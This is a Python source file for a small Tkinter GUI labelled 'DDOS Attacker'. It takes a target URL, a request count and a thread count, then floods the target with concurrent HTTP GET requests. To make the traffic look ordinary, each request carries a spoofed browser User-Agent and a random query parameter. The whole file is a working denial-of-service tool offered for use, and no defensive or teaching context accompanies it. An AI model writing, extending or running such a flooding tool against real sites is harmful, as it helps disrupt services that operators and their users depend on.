import tkinter as tk
from tkinter import ttk
import threading
import requests
import random
from concurrent.futures import ThreadPoolExecutor

# Main window
root = tk.Tk()
root.title("DDOS Attacker")
root.geometry("600x400")
root.configure(bg="black")

# Style
style = ttk.Style()
style.configure("TLabel", background="black", foreground="red", font=("Consolas", 10))
style.configure("TButton", foreground="black", font=("Consolas", 10))

# Global variables
requests_sent = 0
is_running = False

def send_request(url):
    global requests_sent, is_running
    headers = {"User-Agent": "Mozilla/5.0"}
    params = {"id": random.randint(1, 10000)}
    try:
        requests.get(url, headers=headers, params=params, timeout=2)
        requests_sent += 1
        log_box.insert(tk.END, f"[+] Request #{requests_sent}\n")
        log_box.see(tk.END)
    except:
        log_box.insert(tk.END, "[!] Request error\n")
        log_box.see(tk.END)

def start_attack():
    global is_running, requests_sent
    url = url_entry.get()
    threads = int(threads_entry.get())
    amount = int(amount_entry.get())
    requests_sent = 0
    is_running = True
    log_box.insert(tk.END, "[*] Starting attack...\n")
    log_box.see(tk.END)

    def run():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(amount):
                if is_running:
                    executor.submit(send_request, url)

    threading.Thread(target=run).start()

def stop_attack():
    global is_running
    is_running = False
    log_box.insert(tk.END, "[*] Attack stopped.\n")
    log_box.see(tk.END)

# Interface
ttk.Label(root, text="Target URL:").pack(pady=5)
url_entry = ttk.Entry(root, width=50)
url_entry.pack()

ttk.Label(root, text="Number of Requests:").pack(pady=5)
amount_entry = ttk.Entry(root, width=20)
amount_entry.insert(0, "100")
amount_entry.pack()

ttk.Label(root, text="Number of Threads:").pack(pady=5)
threads_entry = ttk.Entry(root, width=20)
threads_entry.insert(0, "30")
threads_entry.pack()

ttk.Button(root, text="Start", command=start_attack).pack(pady=10)
ttk.Button(root, text="Stop", command=stop_attack).pack(pady=5)

log_box = tk.Text(root, bg="black", fg="red", height=10)
log_box.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

root.mainloop()
